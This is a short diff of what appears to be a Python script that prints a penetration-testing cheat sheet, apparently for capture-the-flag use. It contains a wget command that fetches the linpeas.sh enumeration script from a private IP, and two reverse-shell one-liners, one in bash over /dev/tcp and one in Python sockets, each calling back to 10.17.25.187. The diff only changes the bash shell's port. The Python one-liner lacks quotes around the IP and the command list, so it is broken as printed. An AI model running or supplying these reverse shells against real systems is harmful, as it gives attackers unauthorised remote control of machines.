@@ -69,6 +69,6 @@ wget http://10.17.25.187:8000/linpeas.sh
 --------\n''')
 
 print('''----reverse shells----
-bash -i >& /dev/tcp/10.17.25.187/8080 0>&1\n
+bash -i >& /dev/tcp/10.17.25.187/1234 0>&1\n
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.17.25.187,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
 ''')
